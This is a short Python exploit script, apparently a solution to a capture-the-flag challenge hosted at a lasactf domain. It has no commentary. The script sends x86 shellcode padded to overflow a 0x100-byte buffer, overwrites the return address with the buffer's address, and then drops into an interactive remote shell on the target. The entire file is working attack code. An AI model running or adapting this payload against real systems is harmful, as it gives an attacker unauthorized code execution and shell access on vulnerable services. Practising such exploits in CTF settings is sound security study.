#!/usr/bin/env python
from sc_pwn import *

#target     = {'host':'192.168.75.129','port':8080}
target     = {'host':'web.lasactf.com','port':23721}

addr_buf    = 0x00105ef8

#==========
def attack(cmn):
    sc = ShellCode('x86')
    exploit  = sc.sh()
    exploit += '\x00'*(0x100-len(exploit))
    exploit += pack_32(0xdeadbeef)
    exploit += pack_32(addr_buf)

    cmn.read_until('about!')
    cmn.sendln(exploit)


#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='RAW')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
